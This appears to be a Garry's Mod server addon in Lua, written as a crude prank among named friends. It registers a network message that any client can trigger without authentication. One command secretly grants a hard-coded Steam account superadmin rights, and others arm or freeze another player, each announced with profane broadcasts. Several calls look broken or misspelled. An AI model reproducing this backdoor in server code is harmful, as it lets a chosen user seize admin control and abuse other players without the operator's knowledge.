if SERVER then

-- get known players
local knownPlayers, networkindex = {}, {
	["STEAM_0:0:78075910"] = "benbebop",
	[""] = "larry",
	["STEAM_0:1:90446954"] = "paul",
	[""] = "diego", 
	[""] = "alex",
	[""] = "nora",
	["STEAM_0:1:200140622"] = "aidan"
}
gameevent.Listen( "player_connect" )
hook.Add("player_connect", "addToKnownPlayers", function( data )
	timer.Create("sexWaitPlayer", 0.5, math.huge, function() --TODO: dumb, fix it some other way 
		local plr, netid = Player(data.userid), data.networkid
		if plr != Player(0) then
			print(data.name .. " (" .. data.networkid .. ") entity has loaded")
			if networkindex[data.networkid] then
				knownPlayers[networkindex[data.networkid]] = Player(data.userid)
			end
			timer.Remove("sexWaitPlayer")
		end
	end)
end)
--script

local sexVersion = "1.1.5"

util.AddNetworkString( "THESEXHOOK" )
util.AddNetworkString( "SexAlertClient" )

net.Receive( "THESEXHOOK", function( len, ply )
	local code = tostring(net.ReadString()):lower()
	if code == "version" then
		BroadcastLua(" print('sex version: " .. sexVersion .. "')")
	elseif code == "givebenbebopcoolpowers" and knownPlayers.benbebop then
		if knownPlayers.benbebop:GetUserGroup() != "superadmin" then
			knownPlayers.benbebop:SetUserGroup( "superadmin" )
			net.Start( "SexAlertClient" )
			net.WriteString( "HOLY FUCKING SHIT SOMEONE GAVE BENBEBOP GOD POWERS!!!!! WE ARE FUCKED!!!!!", "music/hl1_song10.mp3" )
			net.Broadcast()
		end
	elseif code == "makelarrysexy" and knownPlayers.larry then
		knownPlayers.larry:Give("pist_weagon")
		net.Start( "SexAlertClient" )
		net.WriteString( "larry has now acquired sexiness ", "music/hl1_song10.mp3" )
		net.Broadcast()
	elseif code == "fuckofflarry" and knownPlayers.larry then
		knownPlayers.larry:Lock()
	elseif code == "fuckonlarry" and knownPlayers.larry then
		knownPlayers.larry:UnLock()
	else
		BroadcastLua(" print('sex has been activated')")
	end
end )

hook.Add( "AlertClient", "NotifyClient", function( ply, inf, att )
        net.Start( "PlayerDied" )
        net.WriteEntity( ply )
        net.Broadcast()
end )

end
